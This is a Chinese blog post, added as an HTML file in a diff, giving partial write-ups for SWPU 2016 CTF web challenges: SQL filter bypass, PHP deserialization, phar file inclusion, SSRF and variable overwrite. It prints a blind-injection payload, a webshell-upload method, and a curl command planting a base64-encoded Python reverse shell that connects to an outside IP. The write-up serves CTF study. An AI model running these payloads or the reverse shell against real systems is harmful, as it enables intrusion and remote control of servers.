@@ -1,0 +1,1076 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./SWPU-2016-web-部分思路整理/font-awesome.min.css" rel="stylesheet"/>
+<link href="./SWPU-2016-web-部分思路整理/screen.css" rel="stylesheet"/>
+<link href="./SWPU-2016-web-部分思路整理/prism_okaidia.css" rel="stylesheet"/>
+<link href="./SWPU-2016-web-部分思路整理/bendawang.css" rel="stylesheet"/>
+<script src="./SWPU-2016-web-部分思路整理/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./SWPU-2016-web-部分思路整理/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./SWPU-2016-web-部分思路整理/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="swpu2016web">SWPU-2016-web-部分思路整理</h1>
+<p style="max-width:100%;height:auto;">本来早就该发了，一直以为上周发过了。。。
+事前吐槽下把，不知道是校网的原因还是服务器的原因，我用校园网连不上比赛服务器，
+挂上代理之后能够连上但是又很不方便做题，加上vps有点问题什么的，也就瞬间没了欲望。
+整理下一些题的思路把。
+由于连不上服务器，python脚本也写不了，所以有些题就只有思路，也不算wp。
+加上我个人对题目的理解和分析，由于没有实际做题，如果有问题希望大家指正</p>
+<h2 id="web50">web 50</h2>
+<p style="max-width:100%;height:auto;">源码里面拿到flag</p>
+<h2 id="web2001">web 200-1</h2>
+<p style="max-width:100%;height:auto;">一个什么流量监控系统,在响应头里面拿到<code style="max-width:100%;height:auto;">base64</code>编码的tips,如下:</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$query="SELECT * FROM admin WHERE uname=&amp;apos;".$uname."&amp;apos;";
+if ($row[&amp;apos;passwd&amp;apos;]===$passwd)
+{
+$_SESSION[&amp;apos;flag&amp;apos;] = 1;
+</code></pre>
+<p style="max-width:100%;height:auto;">过滤了很多，空格、#、*、union、、and、or、|、+，--、&amp;、%0a、%0b、%0c、%0d等等，也就没法用联合查询来绕过什么的，也就直接转想盲注把。
+这里我们很容易发现问题所在，并且可以利用来进行盲注
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101145908147" style="max-width:100%;height:auto;"/><br/>
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101145925661" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">观察上面两张图返回完全不一样的答案，所以写个脚本就能猜解出passwd了
+这里脚本我就懒得写了。没有VPS懒得代理了。</p>
+<h2 id="web2002">web 200-2</h2>
+<p style="max-width:100%;height:auto;">也是懒得解决代理问题，
+简单扫一下发现存在备份文件。<code style="max-width:100%;height:auto;">index.php.bak</code>如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(isset($_COOKIE[&amp;apos;user&amp;apos;]))
+{ $login = @unserialize(base64_decode($_COOKIE[&amp;apos;user&amp;apos;]));
+if(!empty($login-&gt;pass)){
+    $status = $login-&gt;check_login();
+    if($status == 1){
+        $_SESSION[&amp;apos;login&amp;apos;] = 1;
+        var_dump("login by cookie!!!");
+    }
+ }
+ }
+</code></pre>
+<p style="max-width:100%;height:auto;">感觉少了些什么，不过肯定是个反序列化漏洞，肯定还有其他文件，换个再扫一下发现了一个<code style="max-width:100%;height:auto;">function.php</code>,而且也是有备份文件的<code style="max-width:100%;height:auto;">function.php.bak</code>,太多不贴代码了。
+就是一个反序列化构造，绕过<code style="max-width:100%;height:auto;">checksql()</code>函数，然后还是因为网络原因暂时没法儿用burp，也懒得下其他浏览器插件来改cookie，也就没有实际做这道题。
+由于最近恰好在做代码审计，发现这个过滤感觉挺像<code style="max-width:100%;height:auto;">80sec-ids</code>的过滤，刚看完不久
+附链接：http://www.cheery.win/?p=119可以用单撇号来bypass。</p>
+<p style="max-width:100%;height:auto;">PS：正常的80sec-ids最初的匹配是</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(preg_match(&amp;apos;/[^0-9a-z@._-]{1,}(union|sleep|benchmark|load_file|outfile)[^0-9a-z@.-]{1,}/&amp;apos;, $sql))
+{
+$this-&amp;gt;DisplayError("$sql||SelectBreak",1);
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">但是本题的是：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if ($querytype == &amp;apos;select&amp;apos;) {
+            $notallow1 = "[^0-9a-z@\._-]{1,}(load_file|outfile)[^0-9a-z@\.-]{1,}";
+            if (preg_match("/".$notallow1."/i", $db_string)) {
+                exit("Error");
+            }
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">所以猜测这里多半会用<code style="max-width:100%;height:auto;">sleep、benchmark</code>什么的把。
+接下来这里我结合自己分析下这个改版的<code style="max-width:100%;height:auto;">80sec-ids</code>把。
+首先第一部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if ($querytype == &amp;apos;select&amp;apos;) {
+            $notallow1 = "[^0-9a-z@\._-]{1,}(load_file|outfile)[^0-9a-z@\.-]{1,}";
+            if (preg_match("/".$notallow1."/i", $db_string)) {
+                exit("Error");
+            }
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">这里过滤<code style="max-width:100%;height:auto;">select</code>语句的一些特殊语法，不过这里没有直接过滤<code style="max-width:100%;height:auto;">sleep</code>和<code style="max-width:100%;height:auto;">benchmark</code>，所以就有机会bypass。
+接下来就是关键部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">while (TRUE) {
+            $pos = strpos($db_string, &amp;apos;\&amp;apos;&amp;apos;, $pos + 1);
+            if ($pos === FALSE) {
+                break;
+            }
+            $clean.= substr($db_string, $old_pos, $pos - $old_pos);
+            while (TRUE) {
+                $pos1 = strpos($db_string, &amp;apos;\&amp;apos;&amp;apos;, $pos + 1);
+                $pos2 = strpos($db_string, &amp;apos;\\&amp;apos;, $pos + 1);
+                if ($pos1 === FALSE) {
+                    break;
+                }
+                elseif($pos2 == FALSE || $pos2 &gt; $pos1) {
+                    $pos = $pos1;
+                    break;
+                }
+                $pos = $pos2 + 1;
+            }
+            $clean.= &amp;apos;$s$&amp;apos;;
+            $old_pos = $pos + 1;
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">这里通过匹配 <code style="max-width:100%;height:auto;">‘</code>确定提取出每两个单引号直接的内容，并且将其中的内容通过 substr()函数截断下来，再将剩下来的语句进行匹配，所以只要我们将我们需要的语句藏在 两个单引号之间就OK了</p>
+<p style="max-width:100%;height:auto;">简单的说就是如下图所示，我输入第一行，然后被一通操作搞成第二行的样子然后进行接下来的过滤。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150057179" style="max-width:100%;height:auto;"/><br/>
+也就是说，下述的过滤代码都是对第二行这样子的进行过滤，所以我们就可以把我们的东西藏在单引号里面来bypass</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">        if (strpos($clean, &amp;apos;@&amp;apos;) !== FALSE OR strpos($clean, &amp;apos;char(&amp;apos;) !== FALSE OR strpos($clean, &amp;apos;"&amp;apos;) !== FALSE OR strpos($clean, &amp;apos;$s$$s$&amp;apos;) !== FALSE) {
+            $fail = TRUE;
+            if (preg_match("#^create table#i", $clean)) $fail = FALSE;
+            $error = "unusual character";
+        }
+        elseif(strpos($clean, &amp;apos;/*&amp;apos;) !== FALSE || strpos($clean, &amp;apos;-- &amp;apos;) !== FALSE || strpos($clean, &amp;apos;#&amp;apos;) !== FALSE) {
+            $fail = TRUE;
+            $error = "comment detect";
+        }
+        elseif(strpos($clean, &amp;apos;sleep&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])sleep($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "slown down detect";
+        }
+        elseif(strpos($clean, &amp;apos;benchmark&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])benchmark($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "slown down detect";
+        }
+        elseif(strpos($clean, &amp;apos;load_file&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])load_file($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "file fun detect";
+        }
+        elseif(strpos($clean, &amp;apos;into outfile&amp;apos;) !== FALSE &amp;&amp; preg_match(&amp;apos;~(^|[^a-z])into\s+outfile($|[^[a-z])~is&amp;apos;, $clean) != 0) {
+            $fail = TRUE;
+            $error = "file fun detect";
+        }
+</code></pre>
+<p style="max-width:100%;height:auto;">所以总的来说我们这里肯定是利用<code style="max-width:100%;height:auto;">sleep</code>进行bool盲注，所以就需要把<code style="max-width:100%;height:auto;">sleep</code>藏在两个单引号之间。
+再简单的说，下面两个句子的效果是一样的。</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">select `&amp;apos;`.``.passwd from admin;   
+select passwd from admin;
+</code></pre>
+<p style="max-width:100%;height:auto;">但是利用上面的句子我们可以bypass掉过滤，这样我们就可以构造sql语句进行爆破了，给个poc如下：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">admin&amp;apos; and (select 1 from flag where ascii(substring(flag,1,1))=30) and (`&amp;apos;`.``.flag=1 or sleep(5)) #
+</code></pre>
+<p style="max-width:100%;height:auto;">另外我们还要注意一个地方，
+<code style="max-width:100%;height:auto;">login()</code>函数，如果我们想要搞定这个，就需要把里面的<code style="max-width:100%;height:auto;">__wakeup</code>给pass掉，我之前分析过这个漏洞，
+链接：http://blog.csdn.net/qq_19876131/article/details/52890854
+所以综上就可以做题了。具体就没操作了，要是分析的有问题希望大家指正</p>
+<h2 id="web100web2003">web 100 和web 200-3</h2>
+<p style="max-width:100%;height:auto;">文件包含，这里注意它会在你的输入后面强制加上<code style="max-width:100%;height:auto;">.php</code>，所以通过<code style="max-width:100%;height:auto;">php://filter</code>读源码的时候要注意下</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://web2.08067.me/include.php?file=php://filter/convert.base64-encode/resource=upload
+http://web2.08067.me/include.php?file=php://filter/convert.base64-encode/resource=include
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到<code style="max-width:100%;height:auto;">include.php</code>如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+Tips: the parameter is file! :)
+&lt;!-- upload.php --&gt;
+&lt;/html&gt;
+&lt;?php
+    @$file = $_GET["file"];
+    if(isset($file))
+    {
+        if (preg_match(&amp;apos;/http|data|ftp|input|%00/i&amp;apos;, $file) || strstr($file,"..") !== FALSE || strlen($file)&gt;=70)
+        {
+            echo "&lt;p&gt; error! &lt;/p&gt;";
+        }
+        else
+        {
+            include($file.&amp;apos;.php&amp;apos;);
+        }
+    }
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后<code style="max-width:100%;height:auto;">upload.php</code>如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;form action="" enctype="multipart/form-data" method="post"
+name="upload"&gt;file:&lt;input type="file" name="file" /&gt;&lt;br&gt;
+&lt;input type="submit" value="upload" /&gt;&lt;/form&gt;
+
+&lt;?php
+if(!empty($_FILES["file"]))
+{
+    echo $_FILE["file"];
+    $allowedExts = array("gif", "jpeg", "jpg", "png");
+    @$temp = explode(".", $_FILES["file"]["name"]);
+    $extension = end($temp);
+    if (((@$_FILES["file"]["type"] == "image/gif") || (@$_FILES["file"]["type"] == "image/jpeg")
+    || (@$_FILES["file"]["type"] == "image/jpg") || (@$_FILES["file"]["type"] == "image/pjpeg")
+    || (@$_FILES["file"]["type"] == "image/x-png") || (@$_FILES["file"]["type"] == "image/png"))
+    &amp;&amp; (@$_FILES["file"]["size"] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts))
+    {
+        move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);
+        echo "file upload successful!Save in:  " . "upload/" . $_FILES["file"]["name"];
+    }
+    else
+    {
+        echo "upload failed!";
+    }
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">观察这里用白名单来过滤，那么想到伪协议什么的，吧一句话写到一个php里面，压缩成zip，再改名上传，用zip或是phar包含应该就可以了，
+注意这里一句话的传参数不能用get（好吧估计也就我个人喜欢用GET）。
+具体操作就是
+创建一个bendawang.php，写入一句话，然后压缩成<code style="max-width:100%;height:auto;">bdw.zip</code>，该后缀为<code style="max-width:100%;height:auto;">bdw.jpg</code>，上传，然后访问<code style="max-width:100%;height:auto;">http://web2.08067.me/include.php?file=phar://upload/bdw.jpg/bendawang</code>，如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150144415" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150153962" style="max-width:100%;height:auto;"/><br/>
+拿到flag并且拿到下一个tip，
+利用webshell先反弹个shell好操作一些，再执行如下代码，往我自己的vps上弹一个shell。</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl -d "a=%24f%3Dfopen%28%22%2ftmp%2fa.py%22%2C%22wb%22%29%3Bfwrite%28%24f%2Cbase64_decode%28%22aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwNC4xNjAuNDMuMTU0Iiw1NTU1NSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7%22%29%29%3B%0Afclose%28%24f%29%3Bsystem%28%22python%20%2ftmp%2fa.py%22%29%3B" "http://web2.08067.me/include.php?file=phar://upload/bdw.jpg/bendawang"
+</code></pre>
+<p style="max-width:100%;height:auto;">根据tomcat加root那么都不用想肯定是提权，那就是最近的<code style="max-width:100%;height:auto;">CVE-2016-1240</code>了。
+<code style="max-width:100%;height:auto;">freebuf</code>上有poc，但是这里要注意需要的是tomcat的用户才能提权，现在已经有<code style="max-width:100%;height:auto;">www-date</code>的shell了，往tomcat目录下写个jsp马
+如下，没用自己的电脑做所以临时找的比较挫不过没事：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150229165" style="max-width:100%;height:auto;"/><br/>
+接下来就是回连，以及执行poc，由于网速太渣和服务器太渣，实在是太慢了，后续工作就没有做了。</p>
+<h2 id="web300">web 300</h2>
+<p style="max-width:100%;height:auto;">一个明显的ssrf，<code style="max-width:100%;height:auto;">file:///etc/issue</code>读到是centos，然后查看网卡信息<code style="max-width:100%;height:auto;">/etc/sysconfig/network-scripts/ifcfg-eth0</code>，如下：
+ <br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150304166" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">写个脚本跑下发现<code style="max-width:100%;height:auto;">172.16.181.166</code>开着80端口，根据回显应该就是这个ip了，
+然后在那字典跑目录，发现存在一个/admin目录
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150321947" style="max-width:100%;height:auto;"/><br/>
+下面还有个<code style="max-width:100%;height:auto;">login.php</code>，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;html lang="en"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;/head&gt;&lt;body class="signin"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"&gt;
+    &lt;title&gt;wllmctf管理中心&lt;/title&gt;
+            &lt;form method="post" action=wllmctf_login.php&gt;
+                &lt;h4 class="no-margins"&gt;后台登录&lt;/h4&gt;
+                &lt;input type="text" class="form-control uname" id="user" name="username" placeholder="用户名"&gt;
+                &lt;input type="password" class="form-control pword m-b" name="password" placeholder="密码"&gt;
+                &lt;button id="submit" name="submit" class="btn btn-success btn-block"&gt;登录&lt;/button&gt;
+            &lt;/form&gt;
+&lt;!-- Mirrored from www.zi-han.net/theme/hplus/login_v2.html by HTTrack Website Copier/3.x [XR&amp;CO&amp;apos;2014], Wed, 20 Jan 2016 14:19:52 GMT --&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<h2 id="web400">web 400</h2>
+<p style="max-width:100%;height:auto;">进入网页折腾半天没什么收获，然后扫了下目录发现个<code style="max-width:100%;height:auto;">web.zip</code>，里面有源码，代码审计。
+首先看<code style="max-width:100%;height:auto;">common.php</code>，重点这部分
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150354260" style="max-width:100%;height:auto;"/><br/>
+把传参直接搞成变量，必然存在变量覆盖问题。
+但是找找可用的变量，只有在<code style="max-width:100%;height:auto;">riji.php</code>下面，有一个<code style="max-width:100%;height:auto;">$id</code>变量，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+require_once("common.php");
+session_start();
+if (@$_SESSION[&amp;apos;login&amp;apos;] !== 1)
+{
+   header(&amp;apos;Location:/web/index.php&amp;apos;);
+  exit();
+}
+if($_SESSION[&amp;apos;user&amp;apos;])
+{
+  $username = $_SESSION[&amp;apos;user&amp;apos;];
+  @mysql_conn();
+  $sql = "select * from user where name=&amp;apos;$username&amp;apos;";
+  $result = @mysql_fetch_array(mysql_query($sql));
+  mysql_close();
+  if($result[&amp;apos;userid&amp;apos;])
+  {
+     $id = intval($result[&amp;apos;userid&amp;apos;]);
+  }
+}
+else
+{
+  exit();
+}
+?&gt;
+&lt;!DOCTYPE HTML&gt;
+&lt;html lang="zh-CN"&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;title&gt;日记系统&lt;/title&gt;
+&lt;meta name="keywords" content="日记系统" /&gt;
+&lt;meta name="description" content="" /&gt;
+&lt;link rel="stylesheet" href="css/index.css"/&gt;
+&lt;link rel="stylesheet" href="css/style.css"/&gt;
+&lt;link rel="stylesheet" href="css/animate.css"/&gt;
+&lt;script type="text/javascript" src="js/jquery1.42.min.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript" src="js/jquery.SuperSlide.2.1.1.js"&gt;&lt;/script&gt;
+&lt;!--[if lt IE 9]&gt;
+&lt;script src="js/html5.js"&gt;&lt;/script&gt;
+&lt;![endif]--&gt;
+&lt;/head&gt;
+&lt;body&gt;
+     &lt;!--header start--&gt;
+   &lt;div id="header"&gt;
+     &lt;h1&gt;日记系统&lt;/h1&gt;
+     &lt;p&gt;一个给小美的日记系统&lt;/p&gt;    
+   &lt;/div&gt;
+    &lt;!--header end--&gt;
+   &lt;!--nav--&gt;
+    &lt;div id="nav"&gt;
+        &lt;ul&gt;
+        &lt;li&gt;&lt;a href="index.php"&gt;登陆&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="forget.php"&gt;找回密码&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href="riji.php"&gt;个人日记&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href="guestbook.php"&gt;写日记&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href="logoff.php?off=1"&gt;注销&lt;/a&gt;&lt;/li&gt;
+        &lt;div class="clear"&gt;&lt;/div&gt;
+       &lt;/ul&gt;
+     &lt;/div&gt;
+      &lt;!--nav end--&gt;
+   &lt;!--content start--&gt;
+   &lt;div id="content"&gt;
+      &lt;!--left--&gt;
+        &lt;div class="left" id="riji"&gt;
+          &lt;div class="weizi"&gt;
+          &lt;div class="wz_text"&gt;当前位置：&lt;a href="#"&gt;首页&lt;/a&gt;&gt;&lt;h1&gt;个人日记&lt;/h1&gt;&lt;/div&gt;
+          &lt;/div&gt;
+          &lt;div class="rj_content"&gt;
+           &lt;?php
+           @mysql_conn();
+           $sql1 = "select * from msg where userid= $id order by id";
+           $query = mysql_query($sql1);
+           $result1 = array();
+           while($temp=mysql_fetch_assoc($query)) {
+              $result1[]=$temp;
+           }
+           mysql_close();
+           foreach($result1 as $x=&gt;$o)
+           {
+              echo display($o[&amp;apos;msg&amp;apos;]);
+           }
+           ?&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+   &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">但是我们观察第一部分代码，既然我们要覆盖，那么我们就不能让<code style="max-width:100%;height:auto;">$result[&amp;apos;userid&amp;apos;]</code>有值，但是我们还要必须保证<code style="max-width:100%;height:auto;">$_SESSION[&amp;apos;user&amp;apos;]</code>有值，不然就会<code style="max-width:100%;height:auto;">exit</code>，这里问题就是，我们如何做到没有这个用户但还要保留这个用户的<code style="max-width:100%;height:auto;">$session</code>，这里没有用到的<code style="max-width:100%;height:auto;">api.php</code>就起到作用了。</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+require_once("common.php");
+session_start();
+if (@$_SESSION[&amp;apos;login&amp;apos;] === 1){
+   header(&amp;apos;Location:/web/riji.php&amp;apos;);
+  exit();
+}
+class admin {
+  var $name;
+  var $check;
+  var $data;
+  var $method;
+  var $userid;
+  var $msgid;
+  function check(){
+     $username = addslashes($this-&gt;name);//�������ݿ�����ݽ���ת��
+     @mysql_conn();
+     $sql = "select * from user where name=&amp;apos;$username&amp;apos;";
+     $result = @mysql_fetch_array(mysql_query($sql));
+     mysql_close();
+     if(!empty($result)){
+        //���� salt ��֤�Ƿ�Ϊ���û�
+        if($this-&gt;check === md5($result[&amp;apos;salt&amp;apos;] . $this-&gt;data . $username)){
+           echo &amp;apos;(=-=)!!&amp;apos;;
+           if($result[&amp;apos;role&amp;apos;] == 1){//����Ƿ�Ϊadmin�û�
+              return 1;
+           }
+           else{
+              return 0;
+           }
+        }
+        else{
+           return 0;
+        }
+     }
+     else{
+        return 0;
+     }
+  }
+  function do_method(){
+     if($this-&gt;check() === 1){
+        if($this-&gt;method === &amp;apos;del_msg&amp;apos;){
+           $this-&gt;del_msg();
+        }
+        elseif($this-&gt;method === &amp;apos;del_user&amp;apos;){
+           $this-&gt;del_user();
+        }
+        else{
+           exit();
+        }
+     }
+  }
+  function del_msg(){
+     if($this-&gt;msgid)
+     {
+        $msg_id = intval($this-&gt;msgid);//��ע��
+        @mysql_conn();
+        $sql1 = "DELETE FROM msg where id=&amp;apos;$msg_id&amp;apos;";
+        if(mysql_query($sql1)){
+           echo(&amp;apos;&lt;script&gt;alert("Delete message success!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        else{
+           echo(&amp;apos;&lt;script&gt;alert("Delete message wrong!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        mysql_close();
+     }
+     else{
+        echo(&amp;apos;&lt;script&gt;alert("Check Your msg_id!!")&lt;/script&gt;&amp;apos;);
+        exit();
+     }
+  }
+  function del_user(){
+     if($this-&gt;userid){
+        $user_id = intval($this-&gt;userid);//��ע��
+        if($user_id == 1){
+           echo(&amp;apos;&lt;script&gt;alert("Admin can\&amp;apos;t delete!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        @mysql_conn();
+              $sql2 = "DELETE FROM user where userid=&amp;apos;$user_id&amp;apos;";
+        if(mysql_query($sql2)){
+           echo(&amp;apos;&lt;script&gt;alert("Delete user success!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        else{
+           echo(&amp;apos;&lt;script&gt;alert("Delete user wrong!!")&lt;/script&gt;&amp;apos;);
+           exit();
+        }
+        mysql_close();
+     }
+     else{
+        echo(&amp;apos;&lt;script&gt;alert("Check Your user_id!!")&lt;/script&gt;&amp;apos;);
+        exit();
+     }
+  }
+}
+$a = unserialize(base64_decode($api));
+$a-&gt;do_method();
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">非常明显的反序列化注入，而且正好能够删除用户，加上代码里面没有地方销毁session,那么正好是我们所想要达到的目标。
+但是我们看看代码，有一个<code style="max-width:100%;height:auto;">check()</code>函数被调用了，如果能够绕过就很方便了，看看函数，重点部分：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if($this-&gt;check === md5($result[&amp;apos;salt&amp;apos;] . $this-&gt;data . $username)){
+           echo &amp;apos;(=-=)!!&amp;apos;;
+           if($result[&amp;apos;role&amp;apos;] == 1){//����Ƿ�Ϊadmin�û�
+              return 1;
+           }
+           else{
+              return 0;
+           }
+</code></pre>
+<p style="max-width:100%;height:auto;">这里需要获取<code style="max-width:100%;height:auto;">$salt</code>，但是我们看看<code style="max-width:100%;height:auto;">index.php</code>。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./SWPU-2016-web-部分思路整理/20161101150419793" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">所以全部都在cookie里面了，所以接下来就可以删除用户了，然后到达覆盖变量id的目的，从而完成注入。由于没有实际做题，所以后续的做法也不知道，就只能分析到这里了。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./SWPU-2016-web-部分思路整理/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="swpu2016web">SWPU-2016-web-部分思路整理</h1>
+<p style="max-width:100%;height:auto;">本来早就该发了，一直以为上周发过了。。。
+事前吐槽下把，不知道是校网的原因还是服务器的原因，我用校园网连不上比赛服务器，
+挂上代理之后能够连上但是又很不方便做题，加上vps有点问题什么的，也就瞬间没了欲望。
+整理下一些题的思路把。
